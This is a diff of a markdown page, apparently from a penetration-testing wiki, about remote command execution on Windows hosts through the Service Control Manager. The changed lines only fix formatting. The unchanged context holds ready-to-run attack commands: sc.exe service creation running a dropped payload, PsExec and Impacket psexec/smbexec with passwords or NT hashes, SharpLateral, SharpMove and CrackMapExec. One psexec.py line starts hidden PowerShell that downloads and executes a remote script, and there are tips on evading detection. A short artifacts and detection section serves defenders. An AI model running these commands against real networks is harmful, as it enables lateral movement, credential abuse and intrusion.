@@ -1,6 +1,5 @@
 # PsExec/Winexec/ScExec/SMBExec
 
-
 ## How do they work
 
 These techniques abuse the Windows Service Control Manager (SCM) remotely over SMB/RPC to execute commands on a target host. The common flow is:
@@ -33,7 +32,7 @@ sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= de
 sc.exe \\TARGET start HTSvc
 sc.exe \\TARGET delete HTSvc
 ```
-```
+
 Notes:
 - Expect a timeout error when starting a non-service EXE; execution still happens.
 - To remain more OPSEC-friendly, prefer fileless commands (cmd /c, powershell -enc) or delete dropped artifacts.
@@ -57,13 +56,13 @@ PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami 
 :: Customize the service name for OPSEC (-r)
 PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
 ```
-```
+
 - You can launch directly from Sysinternals Live via WebDAV:
 
 ```cmd
 \\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
 ```
-```
+
 OPSEC
 - Leaves service install/uninstall events (Service name often PSEXESVC unless -r is used) and creates C:\Windows\PSEXESVC.exe during execution.
 
@@ -84,7 +83,7 @@ psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe
 # Change service name and output encoding
 psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
 ```
-```
+
 Artifacts
 - Temporary EXE in C:\Windows\ (random 8 chars). Service name defaults to RemComSvc unless overridden.
 
@@ -96,29 +95,29 @@ Artifacts
 smbexec.py DOMAIN/user:Password@HOST
 smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
 ```
-```
+
 ### SharpLateral and SharpMove
 
-- [[https://github.com/mertdas/SharpLateral) (C#|SharpLateral]] implements several lateral movement methods including service-based exec.
+- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implements several lateral movement methods including service-based exec.
 
 ```cmd
 SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
 ```
-```
-- [[https://github.com/0xthirteen/SharpMove|SharpMove]] includes service modification/creation to execute a command remotely.
+
+- [SharpMove](https://github.com/0xthirteen/SharpMove) includes service modification/creation to execute a command remotely.
 
 ```cmd
 SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
 SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
 ```
-```
+
 - You can also use CrackMapExec to execute via different backends (psexec/smbexec/wmiexec):
 
 ```bash
 cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
 cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
 ```
-```
+
 ## OPSEC, detection and artifacts
 
 Typical host/network artifacts when using PsExec-like techniques:
@@ -153,7 +152,6 @@ Hunting ideas
 - WinRM-based remote exec:
 
 [[./winrm.md]]
-
 
 ## References
 
